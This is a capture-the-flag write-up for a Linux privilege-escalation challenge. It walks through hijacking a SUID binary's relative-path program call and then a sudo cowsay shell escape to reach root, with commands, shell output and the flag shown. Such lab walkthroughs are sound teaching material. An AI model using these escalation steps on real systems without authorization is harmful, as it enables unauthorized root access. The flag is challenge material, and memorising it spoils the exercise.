# Undercover#2

### Category

System

### Description

You have been recruited by the CEO of Hero & Co. to test their security. But before handing you out the assignement, the asked you have to prove yourself, and escalate your privileges on this test system all the way to root.

The base credentials are:
```
user1:password123
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

As the flag suggest, this is a very basic privilege escalation exercise.

First, user1 is allowed to run the `hmmm` binary which is owned by user2, and has the SUID bit set.
```
user1@3d3311eb9fad:~$ ls -l hmmm 
-rwsrwsr-x 1 user2 user2 915136 May  8 21:48 hmmm
```

If we run it, we see the ruid is set to uid, and it runs and inexisting `WTFFFFF` program.
```
user1@30b4cc252fc8:~$ ./hmmm 
Not sure why, but I'm gonna set my ruid to my uid.
Not sure why, but I'm gonna run the 'WTFFFFF' program right now.
sh: 1: ./WTFFFFF: not found
```

Let's create that program.
```
user1@30b4cc252fc8:~$ echo "/bin/bash" > WTFFFFF && chmod +x WTFFFFF
user1@30b4cc252fc8:~$ ./hmmm 
Not sure why, but I'm gonna set my ruid to my uid.
Not sure why, but I'm gonna run the 'WTFFFFF' program right now.
user2@30b4cc252fc8:~$ whoami
user2
```

Here we go !

Next up, let's see which sudo rights user2 has.
```
user2@30b4cc252fc8:~$ sudo -l
Matching Defaults entries for user2 on 30b4cc252fc8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user2 may run the following commands on 30b4cc252fc8:
    (root) NOPASSWD: /usr/games/cowsay
```

user2 is allowed to run the very usefull utilitary program `cowsay` as root, without password.

https://gtfobins.github.io/ states
```
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
sudo cowsay -f $TF x
```

Let's run this by replacing cowsay with it's absolute path.
```
user2@30b4cc252fc8:~$ TF=$(mktemp)
user2@30b4cc252fc8:~$ echo 'exec "/bin/sh";' >$TF
user2@30b4cc252fc8:~$ sudo $(which cowsay) -f $TF x
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag.txt	
Hero{B4ck_2_b4s1cs}
```
 Congratz !

### Flag

```Hero{B4ck_2_b4s1cs}```